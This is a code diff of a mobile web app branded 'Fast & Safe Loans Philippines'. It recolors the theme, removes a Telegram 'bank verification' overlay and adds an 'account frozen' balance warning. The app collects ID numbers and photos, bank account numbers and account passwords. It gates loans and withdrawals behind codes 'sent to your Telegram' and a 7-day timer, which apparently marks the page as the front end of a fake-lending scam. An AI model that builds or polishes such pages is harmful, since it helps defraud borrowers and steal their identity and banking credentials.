@@ -7,73 +7,73 @@
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-  :root{--yellow:#f0b90b;--yellow-dark:#d4a309;--yellow-light:#fff8e1;--bg:#fafafa;--card:#ffffff;--border:#e8e8e8;--text:#1a1a1a;--text2:#666;--text3:#999;--shadow:0 2px 16px rgba(0,0,0,0.08);--radius:16px;}
+  :root{--green:#0d7a3e;--green-dark:#06522a;--green-light:#e8f5ed;--bg:#f2faf5;--card:#ffffff;--border:#d0e6d8;--text:#0a2a1a;--text2:#2a5a3a;--text3:#5a8a6a;--shadow:0 2px 16px rgba(13,122,62,0.10);--radius:16px;}
   body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:flex-start;}
   #app{width:100%;max-width:480px;min-height:100vh;background:var(--bg);position:relative;overflow-x:hidden;}
   .screen{display:none;min-height:100vh;flex-direction:column;}
   .screen.active{display:flex;}
 
-  #toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-80px);background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:50px;font-size:14px;font-weight:500;z-index:9999;transition:transform .4s cubic-bezier(.175,.885,.32,1.275);white-space:nowrap;pointer-events:none;}
+  #toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-80px);background:#0a2a1a;color:#fff;padding:12px 24px;border-radius:50px;font-size:14px;font-weight:500;z-index:9999;transition:transform .4s cubic-bezier(.175,.885,.32,1.275);white-space:nowrap;pointer-events:none;}
   #toast.show{transform:translateX(-50%) translateY(0);}
-  #toast.success{background:#00c853;}
-  #toast.error{background:#f44336;}
-  #toast.info{background:#1a1a1a;}
+  #toast.success{background:#0d7a3e;}
+  #toast.error{background:#b33c3c;}
+  #toast.info{background:#0a2a1a;}
 
-  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);z-index:8000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px;}
+  .overlay{position:fixed;inset:0;background:rgba(10,42,26,0.7);backdrop-filter:blur(6px);z-index:8000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px;}
   .overlay.active{display:flex;}
-  .overlay-card{background:#fff;border-radius:24px;padding:32px 24px;width:100%;max-width:340px;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,.2);}
+  .overlay-card{background:#fff;border-radius:24px;padding:32px 24px;width:100%;max-width:340px;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,.15);}
   .overlay-card h3{font-size:20px;font-weight:700;margin-bottom:8px;color:var(--text);}
   .overlay-card p{font-size:14px;color:var(--text2);margin-bottom:16px;line-height:1.6;}
 
   .auth-wrap{flex:1;display:flex;flex-direction:column;justify-content:center;padding:32px 24px;}
   .auth-logo{display:flex;align-items:center;gap:12px;margin-bottom:40px;}
-  .auth-logo .logo-icon{width:48px;height:48px;background:var(--yellow);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;color:#1a1a1a;}
+  .auth-logo .logo-icon{width:48px;height:48px;background:var(--green);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;color:#fff;}
   .auth-logo .logo-text{display:flex;flex-direction:column;}
   .auth-logo .logo-text strong{font-size:18px;font-weight:800;color:var(--text);}
   .auth-logo .logo-text span{font-size:12px;color:var(--text3);font-weight:400;}
-  .auth-title{font-size:26px;font-weight:800;margin-bottom:8px;}
+  .auth-title{font-size:26px;font-weight:800;margin-bottom:8px;color:var(--text);}
   .auth-sub{font-size:14px;color:var(--text2);margin-bottom:32px;}
   .form-group{margin-bottom:16px;}
   .form-group label{display:block;font-size:13px;font-weight:600;color:var(--text2);margin-bottom:6px;letter-spacing:.3px;}
   .form-group input,.form-group select{width:100%;padding:14px 16px;border:1.5px solid var(--border);border-radius:12px;font-size:15px;font-family:inherit;background:#fff;color:var(--text);outline:none;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none;}
-  .form-group input:focus,.form-group select:focus{border-color:var(--yellow);box-shadow:0 0 0 3px rgba(240,185,11,.12);}
+  .form-group input:focus,.form-group select:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(13,122,62,.12);}
   .form-group .pw-wrap{position:relative;}
   .form-group .pw-wrap input{padding-right:48px;}
   .form-group .pw-toggle{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--text3);font-size:18px;padding:4px;}
-  .btn-primary{width:100%;padding:16px;background:var(--yellow);color:#1a1a1a;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:background .2s,transform .1s;margin-top:8px;font-family:inherit;}
-  .btn-primary:active{transform:scale(.98);background:var(--yellow-dark);}
+  .btn-primary{width:100%;padding:16px;background:var(--green);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:background .2s,transform .1s;margin-top:8px;font-family:inherit;}
+  .btn-primary:active{transform:scale(.98);background:var(--green-dark);}
   .btn-primary:disabled{opacity:.6;cursor:not-allowed;}
   .btn-secondary{width:100%;padding:16px;background:#fff;color:var(--text);border:2px solid var(--border);border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;margin-top:8px;font-family:inherit;}
   .btn-secondary:active{transform:scale(.98);}
   .auth-switch{text-align:center;margin-top:20px;font-size:14px;color:var(--text2);}
-  .auth-switch a{color:var(--yellow-dark);font-weight:600;cursor:pointer;text-decoration:none;}
+  .auth-switch a{color:var(--green-dark);font-weight:600;cursor:pointer;text-decoration:none;}
   .form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
 
   .dash-header{background:#fff;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;}
   .dash-logo{display:flex;align-items:center;gap:10px;}
-  .dash-logo .logo-icon{width:36px;height:36px;background:var(--yellow);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;color:#1a1a1a;}
-  .dash-logo strong{font-size:15px;font-weight:800;}
+  .dash-logo .logo-icon{width:36px;height:36px;background:var(--green);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;color:#fff;}
+  .dash-logo strong{font-size:15px;font-weight:800;color:var(--text);}
   .btn-logout{background:none;border:1.5px solid var(--border);border-radius:8px;padding:7px 14px;font-size:13px;font-weight:600;cursor:pointer;color:var(--text2);font-family:inherit;transition:all .2s;}
-  .btn-logout:hover{border-color:#f44336;color:#f44336;}
+  .btn-logout:hover{border-color:#b33c3c;color:#b33c3c;}
 
-  .balance-card{background:linear-gradient(135deg,#1a1a1a 0%,#2d2d2d 100%);margin:20px;border-radius:20px;padding:24px;color:#fff;position:relative;overflow:hidden;}
-  .balance-card::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(240,185,11,.15);border-radius:50%;}
-  .balance-card::after{content:'';position:absolute;bottom:-60px;left:-20px;width:200px;height:200px;background:rgba(240,185,11,.08);border-radius:50%;}
-  .balance-label{font-size:12px;font-weight:500;color:rgba(255,255,255,.6);letter-spacing:.8px;text-transform:uppercase;margin-bottom:8px;}
+  .balance-card{background:linear-gradient(135deg,#0d7a3e 0%,#06522a 100%);margin:20px;border-radius:20px;padding:24px;color:#fff;position:relative;overflow:hidden;}
+  .balance-card::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(255,255,255,.06);border-radius:50%;}
+  .balance-card::after{content:'';position:absolute;bottom:-60px;left:-20px;width:200px;height:200px;background:rgba(255,255,255,.04);border-radius:50%;}
+  .balance-label{font-size:12px;font-weight:500;color:rgba(255,255,255,.7);letter-spacing:.8px;text-transform:uppercase;margin-bottom:8px;}
   .balance-amount{font-size:36px;font-weight:800;color:#fff;margin-bottom:4px;line-height:1.2;}
   .balance-amount .currency{font-size:22px;font-weight:600;vertical-align:super;margin-right:2px;}
   .balance-card-row{display:flex;align-items:center;justify-content:space-between;margin-top:16px;}
   .status-badge{padding:5px 12px;border-radius:50px;font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
   .badge-none{background:rgba(255,255,255,.15);color:rgba(255,255,255,.8);}
   .badge-pending{background:rgba(255,165,0,.2);color:#ffb74d;}
-  .badge-approved{background:rgba(0,200,83,.2);color:#69f0ae;}
-  .badge-rejected{background:rgba(244,67,54,.2);color:#ef9a9a;}
+  .badge-approved{background:rgba(13,122,62,.3);color:#a5d6a7;}
+  .badge-rejected{background:rgba(179,60,60,.2);color:#ef9a9a;}
   .badge-waiting{background:rgba(255,165,0,.2);color:#ffb74d;}
-  .loan-type{font-size:12px;color:rgba(255,255,255,.5);font-weight:500;}
+  .loan-type{font-size:12px;color:rgba(255,255,255,.6);font-weight:500;}
 
   .tab-bar{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid var(--border);display:flex;z-index:200;padding-bottom:env(safe-area-inset-bottom);}
   .tab-item{flex:1;display:flex;flex-direction:column;align-items:center;padding:10px 4px 8px;cursor:pointer;transition:color .2s;border:none;background:none;font-family:inherit;color:var(--text3);}
-  .tab-item.active{color:var(--yellow-dark);}
+  .tab-item.active{color:var(--green-dark);}
   .tab-item .tab-icon{font-size:22px;margin-bottom:3px;line-height:1;}
   .tab-item .tab-label{font-size:10px;font-weight:600;letter-spacing:.3px;}
 
@@ -81,14 +81,14 @@
   .tab-panel.active{display:block;}
 
   .section-card{background:#fff;margin:0 20px 16px;border-radius:var(--radius);padding:20px;box-shadow:var(--shadow);border:1px solid var(--border);}
-  .section-title{font-size:16px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+  .section-title{font-size:16px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px;color:var(--text);}
   .section-title .icon{font-size:18px;}
 
   .stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 20px 16px;}
   .stat-card{background:#fff;border-radius:14px;padding:16px;box-shadow:var(--shadow);border:1px solid var(--border);}
   .stat-card .s-label{font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.4px;text-transform:uppercase;margin-bottom:6px;}
   .stat-card .s-value{font-size:20px;font-weight:800;color:var(--text);}
-  .stat-card .s-value.yellow{color:var(--yellow-dark);}
+  .stat-card .s-value.green{color:var(--green-dark);}
 
   .loan-form-wrap{padding:0 20px;}
   .loan-form-wrap .form-group{margin-bottom:14px;}
@@ -97,61 +97,61 @@
   .bank-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px;}
   .bank-card{background:#fff;border:2px solid var(--border);border-radius:12px;padding:12px 8px;display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer;transition:all .2s;}
   .bank-card:active{transform:scale(.96);}
-  .bank-card.selected{border-color:var(--yellow);background:var(--yellow-light);}
+  .bank-card.selected{border-color:var(--green);background:var(--green-light);}
   .bank-card .bank-icon{font-size:22px;}
   .bank-card .bank-name{font-size:10px;font-weight:700;color:var(--text2);text-align:center;line-height:1.2;}
-  .bank-card.selected .bank-name{color:var(--yellow-dark);}
+  .bank-card.selected .bank-name{color:var(--green-dark);}
 
-  .profile-header{background:linear-gradient(135deg,var(--yellow) 0%,var(--yellow-dark) 100%);margin:20px;border-radius:20px;padding:24px;text-align:center;}
-  .profile-avatar{width:80px;height:80px;background:rgba(255,255,255,.25);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 12px;border:3px solid rgba(255,255,255,.3);}
-  .profile-name{font-size:22px;font-weight:800;color:#1a1a1a;}
-  .profile-email{font-size:13px;color:rgba(26,26,26,.6);margin-top:4px;}
+  .profile-header{background:linear-gradient(135deg,var(--green) 0%,var(--green-dark) 100%);margin:20px;border-radius:20px;padding:24px;text-align:center;}
+  .profile-avatar{width:80px;height:80px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 12px;border:3px solid rgba(255,255,255,.3);}
+  .profile-name{font-size:22px;font-weight:800;color:#fff;}
+  .profile-email{font-size:13px;color:rgba(255,255,255,.7);margin-top:4px;}
   .profile-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:16px 20px 0;}
   .profile-stat{background:#fff;border-radius:12px;padding:12px 8px;text-align:center;box-shadow:var(--shadow);border:1px solid var(--border);}
   .profile-stat .ps-value{font-size:18px;font-weight:800;color:var(--text);}
   .profile-stat .ps-label{font-size:10px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.3px;}
-  .profile-stat .ps-value.yellow{color:var(--yellow-dark);}
+  .profile-stat .ps-value.green{color:var(--green-dark);}
   .profile-list{background:#fff;margin:16px 20px;border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);border:1px solid var(--border);}
   .profile-item{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);}
   .profile-item:last-child{border-bottom:none;}
   .profile-item .p-label{font-size:13px;color:var(--text3);font-weight:500;}
   .profile-item .p-value{font-size:13px;font-weight:700;color:var(--text);}
-  .profile-item .p-value.yellow{color:var(--yellow-dark);}
+  .profile-item .p-value.green{color:var(--green-dark);}
   .profile-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:0 20px 16px;}
   .profile-actions .action-btn{background:#fff;border:1.5px solid var(--border);border-radius:12px;padding:14px;text-align:center;font-size:12px;font-weight:600;color:var(--text2);cursor:pointer;transition:all .2s;font-family:inherit;}
   .profile-actions .action-btn:active{transform:scale(.96);}
-  .profile-actions .action-btn.danger{border-color:#f44336;color:#f44336;}
-  .profile-actions .action-btn.primary{border-color:var(--yellow);color:var(--yellow-dark);}
+  .profile-actions .action-btn.danger{border-color:#b33c3c;color:#b33c3c;}
+  .profile-actions .action-btn.primary{border-color:var(--green);color:var(--green-dark);}
 
-  .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:9000;display:none;align-items:center;justify-content:center;padding:20px;}
+  .modal-backdrop{position:fixed;inset:0;background:rgba(10,42,26,0.8);z-index:9000;display:none;align-items:center;justify-content:center;padding:20px;}
   .modal-backdrop.active{display:flex;}
   .modal-box{background:#fff;border-radius:20px;width:100%;max-width:360px;overflow:hidden;position:relative;}
   .modal-head{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
-  .modal-head h4{font-size:16px;font-weight:700;}
+  .modal-head h4{font-size:16px;font-weight:700;color:var(--text);}
   .modal-close{background:none;border:none;font-size:24px;cursor:pointer;color:var(--text3);line-height:1;}
   .modal-body{padding:0;}
   .modal-body img{width:100%;display:block;}
 
   input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0;}
   input[type=number]{-moz-appearance:textfield;}
-  select option{color:#1a1a1a;}
-  .verified-strip{background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:10px 14px;margin:0 20px 12px;font-size:13px;color:#2e7d32;font-weight:600;display:flex;align-items:center;gap:8px;}
+  select option{color:#0a2a1a;}
+  .verified-strip{background:#e8f5ed;border:1px solid #a5d6a7;border-radius:10px;padding:10px 14px;margin:0 20px 12px;font-size:13px;color:#0d7a3e;font-weight:600;display:flex;align-items:center;gap:8px;}
   .code-input{display:flex;gap:10px;justify-content:center;margin:16px 0;}
   .code-input input{width:50px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid var(--border);border-radius:12px;outline:none;transition:border-color .2s;}
-  .code-input input:focus{border-color:var(--yellow);box-shadow:0 0 0 3px rgba(240,185,11,.12);}
+  .code-input input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(13,122,62,.12);}
 
   .swipe-container{width:100%;padding:4px 0;margin:8px 0;}
-  .swipe-track{position:relative;width:100%;height:52px;background:#f0f0f0;border-radius:50px;overflow:hidden;cursor:pointer;user-select:none;touch-action:none;}
-  .swipe-track .swipe-bg{position:absolute;top:0;left:0;height:100%;background:linear-gradient(90deg,var(--yellow),var(--yellow-dark));border-radius:50px;transition:width .1s;width:0%;}
+  .swipe-track{position:relative;width:100%;height:52px;background:#e8f5ed;border-radius:50px;overflow:hidden;cursor:pointer;user-select:none;touch-action:none;}
+  .swipe-track .swipe-bg{position:absolute;top:0;left:0;height:100%;background:linear-gradient(90deg,var(--green),var(--green-dark));border-radius:50px;transition:width .1s;width:0%;}
   .swipe-track .swipe-text{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:var(--text);z-index:2;pointer-events:none;}
-  .swipe-track .swipe-thumb{position:absolute;top:4px;left:4px;width:44px;height:44px;background:#fff;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,.2);z-index:3;display:flex;align-items:center;justify-content:center;font-size:20px;transition:left .05s;touch-action:none;cursor:grab;}
+  .swipe-track .swipe-thumb{position:absolute;top:4px;left:4px;width:44px;height:44px;background:#fff;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,.15);z-index:3;display:flex;align-items:center;justify-content:center;font-size:20px;transition:left .05s;touch-action:none;cursor:grab;}
   .swipe-track .swipe-thumb:active{cursor:grabbing;}
-  .swipe-track .swipe-thumb .arrow{font-size:22px;color:var(--yellow-dark);}
+  .swipe-track .swipe-thumb .arrow{font-size:22px;color:var(--green-dark);}
 
   .loan-code-display{background:#f5f5f5;border-radius:12px;padding:16px;margin:16px 0;}
   .loan-code-display .code-label{font-size:12px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px;}
   .loan-code-display .code-value{font-size:28px;font-weight:800;color:var(--text);letter-spacing:4px;margin-top:4px;}
-  .loan-code-display .code-value .highlight{color:var(--yellow-dark);}
+  .loan-code-display .code-value .highlight{color:var(--green-dark);}
 
   .timer-display{font-size:42px;font-weight:800;color:var(--text);letter-spacing:2px;margin:8px 0;}
   .timer-display .unit{font-size:14px;font-weight:600;color:var(--text3);}
@@ -170,11 +170,11 @@
       <div class="auth-logo">
         <div class="logo-icon">₱</div>
         <div class="logo-text">
-          <strong>Fast &amp; Safe Loans</strong>
+          <strong>Fast & Safe Loans</strong>
           <span>Philippines • Trusted Since 2020</span>
         </div>
       </div>
-      <h1 class="auth-title">Welcome Back 👋</h1>
+      <h1 class="auth-title">Welcome Back</h1>
       <p class="auth-sub">Sign in to your account to continue</p>
       <form id="login-form" autocomplete="off">
         <div class="form-group">
@@ -194,13 +194,13 @@
     </div>
   </div>
 
-  <!-- REGISTER SCREEN -->
+  <!-- REGISTER SCREEN (NO FREEZE OPTION) -->
   <div id="screen-register" class="screen">
     <div class="auth-wrap" style="padding-top:20px;">
       <div class="auth-logo">
         <div class="logo-icon">₱</div>
         <div class="logo-text">
-          <strong>Fast &amp; Safe Loans</strong>
+          <strong>Fast & Safe Loans</strong>
           <span>Philippines</span>
         </div>
       </div>
@@ -260,7 +260,7 @@
       <div class="balance-amount"><span class="currency">₱</span><span id="disp-balance">0.00</span></div>
       <div class="balance-card-row">
         <div>
-          <div class="loan-type">Fast &amp; Safe Loans</div>
+          <div class="loan-type">Fast & Safe Loans</div>
         </div>
         <div id="disp-status-badge" class="status-badge badge-none">No Loan</div>
       </div>
@@ -268,11 +268,12 @@
 
     <div id="panel-home" class="tab-panel active">
       <div style="padding-top:4px;"></div>
-      <div id="verified-strip" class="verified-strip" style="display:none;">✅ Account Verified &amp; Active</div>
+      <div id="verified-strip" class="verified-strip" style="display:none;">Account Verified & Active</div>
+      <div id="freeze-warning" class="verified-strip" style="display:none;background:#fff3e0;border-color:#ffb74d;color:#e65100;">Account Frozen — Balance is read-only</div>
       <div class="stat-grid">
         <div class="stat-card">
           <div class="s-label">Loan Status</div>
-          <div class="s-value yellow" id="home-loan-status">—</div>
+          <div class="s-value green" id="home-loan-status">—</div>
         </div>
         <div class="stat-card">
           <div class="s-label">Loan Amount</div>
@@ -284,7 +285,7 @@
         </div>
         <div class="stat-card">
           <div class="s-label">Slot #</div>
-          <div class="s-value yellow" id="home-slot">—</div>
+          <div class="s-value green" id="home-slot">—</div>
         </div>
       </div>
       <div class="section-label">Quick Actions</div>
@@ -304,7 +305,7 @@
       </div>
       <div class="section-card">
         <div class="section-title"><span class="icon">📢</span>Notice</div>
-        <p style="font-size:13px;color:var(--text2);line-height:1.7;">Fast &amp; Safe Loans Philippines offers quick personal loans with flexible repayment. Apply today and get approved within minutes. Requirements: valid ID and active bank account.</p>
+        <p style="font-size:13px;color:var(--text2);line-height:1.7;">Fast & Safe Loans Philippines offers quick personal loans with flexible repayment. Apply today and get approved within minutes. Requirements: valid ID and active bank account.</p>
       </div>
     </div>
 
@@ -382,7 +383,7 @@
           </div>
           <div class="form-group"><label>Complete Address</label><input type="text" id="loan-address" autocomplete="off"></div>
           <div class="form-group"><label>Loan Amount (₱)</label><input type="number" id="loan-amount" min="1000" max="500000" inputmode="numeric" autocomplete="off"></div>
-          <button type="submit" class="btn-primary" id="loan-btn">📋 Submit Loan Application</button>
+          <button type="submit" class="btn-primary" id="loan-btn">Submit Loan Application</button>
           <div id="loan-status-info" style="margin-top:14px;text-align:center;font-size:13px;color:var(--text2);"></div>
         </form>
       </div>
@@ -394,6 +395,10 @@
       <div class="section-card" style="margin-bottom:8px;">
         <div class="section-title"><span class="icon">🏧</span>Withdraw Funds</div>
         <p style="font-size:13px;color:var(--text2);">Select your bank or e-wallet and enter withdrawal details.</p>
+        <div style="margin-top:10px;background:var(--green-light);padding:12px;border-radius:10px;font-size:14px;font-weight:600;color:var(--green-dark);display:flex;justify-content:space-between;">
+          <span>Available Balance</span>
+          <span id="wd-balance-display">₱0.00</span>
+        </div>
       </div>
       <div style="padding:0 20px;">
         <div class="section-label" style="margin:0 0 10px;">Banks</div>
@@ -416,7 +421,7 @@
         </div>
         <div id="withdraw-form-section" style="display:none;margin-top:4px;">
           <div class="section-card" style="margin:0 0 12px;">
-            <p style="font-size:13px;font-weight:600;color:var(--text2);">Selected: <span id="selected-bank-name" style="color:var(--yellow-dark);"></span></p>
+            <p style="font-size:13px;font-weight:600;color:var(--text2);">Selected: <span id="selected-bank-name" style="color:var(--green-dark);"></span></p>
           </div>
           <div class="form-group"><label>Withdrawal Amount (₱)</label><input type="number" id="wd-amount" placeholder="Enter amount" inputmode="numeric" autocomplete="off"></div>
           <div class="form-group"><label>Account Number / Mobile</label><input type="text" id="wd-account" placeholder="Bank account / mobile number" autocomplete="off" inputmode="numeric"></div>
@@ -427,7 +432,7 @@
               <button type="button" class="pw-toggle" onclick="togglePw('wd-password',this)">👁</button>
             </div>
           </div>
-          <button class="btn-primary" onclick="submitWithdraw()" id="wd-btn">🏧 Process Withdrawal</button>
+          <button class="btn-primary" onclick="submitWithdraw()" id="wd-btn">Process Withdrawal</button>
         </div>
       </div>
     </div>
@@ -440,13 +445,13 @@
         <div class="profile-name" id="prof-name">—</div>
         <div class="profile-email" id="prof-email">—</div>
         <div style="margin-top:8px;">
-          <span class="status-badge badge-approved" id="prof-verified-badge" style="font-size:10px;">✅ Verified</span>
+          <span class="status-badge badge-approved" id="prof-verified-badge" style="font-size:10px;">Verified</span>
         </div>
       </div>
       
       <div class="profile-stats">
         <div class="profile-stat">
-          <div class="ps-value yellow" id="prof-balance">₱0</div>
+          <div class="ps-value green" id="prof-balance">₱0</div>
           <div class="ps-label">Balance</div>
         </div>
         <div class="profile-stat">
@@ -464,12 +469,13 @@
         <div class="profile-item"><span class="p-label">ID Name</span><span class="p-value" id="prof-idname">—</span></div>
         <div class="profile-item"><span class="p-label">ID Number</span><span class="p-value" id="prof-idnumber">—</span></div>
         <div class="profile-item"><span class="p-label">Email</span><span class="p-value" id="prof-email2">—</span></div>
-        <div class="profile-item"><span class="p-label">Loan Amount</span><span class="p-value yellow" id="prof-loanamount">₱0</span></div>
+        <div class="profile-item"><span class="p-label">Loan Amount</span><span class="p-value green" id="prof-loanamount">₱0</span></div>
+        <div class="profile-item"><span class="p-label">Status</span><span class="p-value" id="prof-freeze-status" style="color:var(--text3);">Active</span></div>
       </div>
       
       <div class="profile-actions">
-        <button class="action-btn primary" onclick="openIdModal()">🪪 View ID</button>
-        <button class="action-btn danger" onclick="doLogout()">🚪 Log Out</button>
+        <button class="action-btn primary" onclick="openIdModal()">View ID</button>
+        <button class="action-btn danger" onclick="doLogout()">Log Out</button>
       </div>
     </div>
 
@@ -492,41 +498,10 @@
     </div>
   </div>
 
-  <!-- BANK VERIFICATION OVERLAY -->
-  <div class="overlay" id="overlay-bank-verify">
-    <div class="overlay-card">
-      <h3>🏦 Bank Verification</h3>
-      <p>Enter the verification code sent to your Telegram</p>
-      
-      <div class="code-input">
-        <input type="text" id="bank-code-1" maxlength="1" oninput="moveNext(this,'bank-code-2')">
-        <input type="text" id="bank-code-2" maxlength="1" oninput="moveNext(this,'bank-code-3')">
-        <input type="text" id="bank-code-3" maxlength="1" oninput="moveNext(this,'bank-code-4')">
-        <input type="text" id="bank-code-4" maxlength="1" oninput="moveNext(this,'bank-code-5')">
-        <input type="text" id="bank-code-5" maxlength="1" oninput="moveNext(this,'bank-code-6')">
-        <input type="text" id="bank-code-6" maxlength="1" oninput="moveNext(this,'bank-code-6')">
-      </div>
-      
-      <div class="info-text">📱 Check your Telegram for the verification code</div>
-      
-      <div class="swipe-container" id="swipe-container">
-        <div class="swipe-track" id="swipe-track">
-          <div class="swipe-bg" id="swipe-bg"></div>
-          <div class="swipe-text" id="swipe-text">⬅️ Swipe to Verify</div>
-          <div class="swipe-thumb" id="swipe-thumb">
-            <span class="arrow">➜</span>
-          </div>
-        </div>
-      </div>
-      
-      <button class="btn-secondary" onclick="document.getElementById('overlay-bank-verify').classList.remove('active'); showScreen('screen-login');">🔙 Back</button>
-    </div>
-  </div>
-
   <!-- LOAN CONFIRM OVERLAY -->
   <div class="overlay" id="overlay-loan-confirm">
     <div class="overlay-card">
-      <h3>⏳ Loan Processing</h3>
+      <h3>Loan Processing</h3>
       <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the loan confirmation code sent to your Telegram</p>
       
       <div class="code-input">
@@ -538,7 +513,7 @@
         <input type="text" id="loan-code-6" maxlength="1" oninput="moveNext(this,'loan-code-6')">
       </div>
       
-      <div class="info-text">📱 Check your Telegram for the confirmation code</div>
+      <div class="info-text">Check your Telegram for the confirmation code</div>
       
       <div class="timer-display">
         <span id="loan-confirm-time">7d 00:00</span>
@@ -546,14 +521,14 @@
       
       <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
       
-      <button class="btn-primary" onclick="verifyLoanCode()">✔ Confirm Loan</button>
+      <button class="btn-primary" onclick="verifyLoanCode()">Confirm Loan</button>
     </div>
   </div>
 
   <!-- WITHDRAW CONFIRM OVERLAY -->
   <div class="overlay" id="overlay-wd-confirm">
     <div class="overlay-card">
-      <h3>💸 Withdrawal Confirmation</h3>
+      <h3>Withdrawal Confirmation</h3>
       <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the withdrawal confirmation code sent to your Telegram</p>
       
       <div class="code-input">
@@ -565,7 +540,7 @@
         <input type="text" id="wd-code-6" maxlength="1" oninput="moveNext(this,'wd-code-6')">
       </div>
       
-      <div class="info-text">📱 Check your Telegram for the confirmation code</div>
+      <div class="info-text">Check your Telegram for the confirmation code</div>
       
       <div class="timer-display">
         <span id="wd-confirm-time">01:00</span>
@@ -573,8 +548,8 @@
       
       <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
       
-      <button class="btn-primary" onclick="verifyWdCode()">✔ Confirm Withdrawal</button>
-      <button class="btn-secondary" onclick="cancelWithdraw()">❌ Cancel</button>
+      <button class="btn-primary" onclick="verifyWdCode()">Confirm Withdrawal</button>
+      <button class="btn-secondary" onclick="cancelWithdraw()">Cancel</button>
     </div>
   </div>
 
@@ -582,11 +557,11 @@
   <div class="modal-backdrop" id="modal-id">
     <div class="modal-box">
       <div class="modal-head">
-        <h4>🪪 ID Photo</h4>
+        <h4>ID Photo</h4>
         <button class="modal-close" onclick="closeIdModal()">✕</button>
       </div>
       <div class="modal-body">
-        <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ID Photo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22360%22 height=%22220%22><rect fill=%22%23f0b90b%22 width=%22360%22 height=%22220%22/><text x=%22180%22 y=%22110%22 fill=%22%231a1a1a%22 font-size=%2220%22 text-anchor=%22middle%22 font-family=%22Arial%22>ID Card</text></svg>'">
+        <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ID Photo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22360%22 height=%22220%22><rect fill=%22%230d7a3e%22 width=%22360%22 height=%22220%22/><text x=%22180%22 y=%22110%22 fill=%22%23fff%22 font-size=%2220%22 text-anchor=%22middle%22 font-family=%22Arial%22>ID Card</text></svg>'">
       </div>
     </div>
   </div>
@@ -617,12 +592,8 @@ let wdConfirmTimer = null;
 let pendingLoanAmount = 0;
 let pendingWdAmount = 0;
 let pendingWdData = null;
-let pendingSlot = null;
-let pendingUserData = null;
-let generatedBankCode = '';
 let generatedLoanCode = '';
 let generatedWdCode = '';
-let isSwiping = false;
 
 // ============================================================
 //  SUPABASE HELPERS
@@ -646,45 +617,6 @@ async function supabaseFetch(path, options = {}) {
   }
   
   return response.json();
-}
-
-// ============================================================
-//  DATABASE SCHEMA SETUP
-// ============================================================
